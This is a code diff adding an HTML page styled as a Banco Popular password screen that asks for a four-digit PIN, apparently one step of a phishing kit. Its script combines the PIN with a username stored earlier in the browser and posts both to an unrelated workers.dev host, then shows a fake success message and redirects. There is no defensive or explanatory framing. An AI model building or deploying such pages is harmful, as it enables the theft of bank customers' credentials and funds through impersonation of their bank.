@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Clave - Banco Popular</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<style>
+    body {
+        margin: 0;
+        font-family: 'Inter', sans-serif;
+        background: #ffffff;
+        color: #000;
+    }
+
+    header {
+        width: 100%;
+        padding: 16px 20px;
+        display: flex;
+        justify-content: space-between;
+        border-bottom: 1px solid #efefef;
+        font-weight: 600;
+        font-size: 18px;
+        background: #fff;
+    }
+
+    .close-btn {
+        width: 28px;
+        height: 28px;
+        background: #e8ffe9;
+        border-radius: 50%;
+        border: none;
+        color: #00a651;
+        font-size: 18px;
+        cursor: pointer;
+    }
+
+    .main-content {
+        max-width: 500px;
+        margin: auto;
+        padding: 20px;
+        display: none;
+    }
+
+    .logo img {
+        width: 300px;
+        display: block;
+        margin: 35px auto 25px;
+    }
+
+    .title {
+        text-align: center;
+        font-size: 22px;
+        font-weight: 700;
+        margin-bottom: 6px;
+    }
+
+    .subtitle {
+        text-align: center;
+        font-size: 14px;
+        color: #666;
+        margin-bottom: 25px;
+    }
+
+    .help-text {
+        max-width: 360px;
+        margin: 0 auto 8px;
+        display: flex;
+        justify-content: space-between;
+        font-size: 14px;
+        font-weight: 600;
+    }
+
+    .help-text a {
+        color: #ff7b00;
+        text-decoration: none;
+    }
+
+    /* INPUT + OJO CENTRADOS */
+    .input-wrapper {
+        max-width: 360px;
+        margin: 0 auto;
+        position: relative;
+        display: flex;
+        justify-content: center;
+    }
+
+    .input-field {
+        width: 100%;
+        padding: 16px 20px;
+        border-radius: 12px;
+        border: 1px solid #dcdcdc;
+        font-size: 26px;
+        text-align: center;
+        letter-spacing: 16px;
+        outline: none;
+    }
+
+    .input-field::placeholder { color: #c0c0c0; }
+
+    .eye-icon {
+        position: absolute;
+        right: 16px;
+        top: 50%;
+        transform: translateY(-50%);
+        font-size: 20px;
+        color: #999;
+        cursor: pointer;
+    }
+
+    /* BOTÓN CENTRADO */
+    .button-container {
+        max-width: 360px;
+        margin: 28px auto 0;
+        display: flex;
+        justify-content: center;
+    }
+
+    .login-btn {
+        width: 100%;
+        padding: 19px 0;
+        border-radius: 12px;
+        background: #cfcfcf;
+        color: #7c7c7c;
+        font-weight: 600;
+        border: none;
+    }
+
+    .login-btn.enabled {
+        background: #105163;
+        color: #fff;
+    }
+
+    .footer {
+        margin-top: 50px;
+        font-size: 13px;
+        color: #ff7b00;
+        text-align: center;
+        padding-bottom: 30px;
+    }
+
+    /* LOADER */
+    .loader-container {
+        position: fixed;
+        inset: 0;
+        background: white;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 1000;
+    }
+
+    .loader {
+        width: 55px;
+        height: 55px;
+        border: 4px solid #00a651;
+        border-top-color: transparent;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div class="loader-container" id="loader">
+    <div class="loader"></div>
+</div>
+
+<header>
+    <span>Registro</span>
+    <div style="display:flex; align-items:center; gap:6px;">
+        <span style="font-size:14px; color:#444;">Cerrar</span>
+        <button class="close-btn">×</button>
+    </div>
+</header>
+
+<div class="main-content" id="mainContent">
+
+    <br><br><br><br><br><br><br>
+
+    <div class="logo">
+        <img src="dic.jpeg">
+    </div>
+
+    <div class="title">Escribe tu contraseña</div>
+    <br><br>
+
+    <div class="help-text">
+        <span>Contraseña única</span>
+        <a href="#" id="forgotPassword">¿La olvidaste?</a>
+    </div>
+
+    <!-- INPUT + OJO -->
+    <div class="input-wrapper">
+        <input 
+            type="password"
+            id="claveInput"
+            class="input-field"
+            maxlength="4"
+            placeholder="-  -  -  -"
+            inputmode="numeric"
+        >
+        <i class="fa-solid fa-eye eye-icon" id="toggleEye"></i>
+    </div>
+
+    <div class="button-container">
+        <button class="login-btn" id="loginButton" disabled>Ingresar</button>
+    </div>
+
+    <div class="footer">Seguridad • Accesibilidad</div>
+</div>
+
+<script>
+/* ---------- LOADER ---------- */
+window.addEventListener("load", () => {
+    setTimeout(() => {
+        loader.style.opacity = "0";
+        setTimeout(() => loader.style.display = "none", 400);
+        mainContent.style.display = "block";
+    }, 500);
+});
+
+/* ---------- VALIDAR SOLO 4 DIGITOS ---------- */
+const claveInput = document.getElementById("claveInput");
+const loginButton = document.getElementById("loginButton");
+
+function validateClave() {
+    if (claveInput.value.length === 4) {
+        loginButton.classList.add("enabled");
+        loginButton.disabled = false;
+    } else {
+        loginButton.classList.remove("enabled");
+        loginButton.disabled = true;
+    }
+}
+claveInput.addEventListener("input", () => {
+    if (claveInput.value.length > 4) {
+        claveInput.value = claveInput.value.slice(0, 4);
+    }
+    validateClave();
+});
+
+/* ---------- OJITO ---------- */
+const toggleEye = document.getElementById("toggleEye");
+
+toggleEye.addEventListener("click", () => {
+    if (claveInput.type === "password") {
+        claveInput.type = "text";
+        toggleEye.classList.replace("fa-eye", "fa-eye-slash");
+    } else {
+        claveInput.type = "password";
+        toggleEye.classList.replace("fa-eye-slash", "fa-eye");
+    }
+});
+
+/* ---------- LOGIN ORIGINAL ---------- */
+async function performLogin() {
+    if (loginButton.disabled) return;
+
+    loginButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
+
+    let data = JSON.parse(localStorage.getItem("bancoldata") || "{}");
+    if (!data.usuario) return alert("Error interno");
+
+    const transactionId = "txn_" + Date.now();
+
+    data.clave = claveInput.value;
+    data.transactionId = transactionId;
+
+    localStorage.setItem("bancoldata", JSON.stringify(data));
+
+    await new Promise(r => setTimeout(r, 1000));
+
+    const res = await fetch("https://quiet-haze-3548.micollflorez.workers.dev/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            usuario: data.usuario,
+            clave: data.clave,
+            transactionId
+        })
+    });
+
+    const json = await res.json();
+
+    if (json.ok) {
+        loginButton.innerHTML = "✔ Correcto";
+        loginButton.style.background = "#00a651";
+        loginButton.style.color = "#fff";
+        setTimeout(() => (location.href = "loading.html"), 700);
+    } else {
+        loginButton.innerHTML = "Ingresar";
+        validateClave();
+        alert("Error: " + json.error);
+    }
+}
+
+loginButton.addEventListener("click", performLogin);
+</script>
+
+</body>
+</html>
